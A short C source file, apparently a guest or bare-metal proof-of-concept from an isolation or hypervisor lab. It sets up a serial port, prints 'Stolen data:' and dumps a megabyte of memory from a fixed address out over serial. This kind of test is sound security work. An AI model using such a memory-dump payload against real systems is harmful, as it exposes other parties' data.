#include "../include/types.h"
#include "../include/io.h"
#include "../include/serial.h"
#include "../include/util_lib.h"

void start()
{
    setup_serial(COM1_BASE_ADDR);
    const char *str = "Stolen data:\n\n";
    serial_write_string(COM1_BASE_ADDR, str, strlen(str));

    uint32_t addr = 0x400000;

    dump_memory_to_serial(addr, 0x100000, COM1_BASE_ADDR);
}
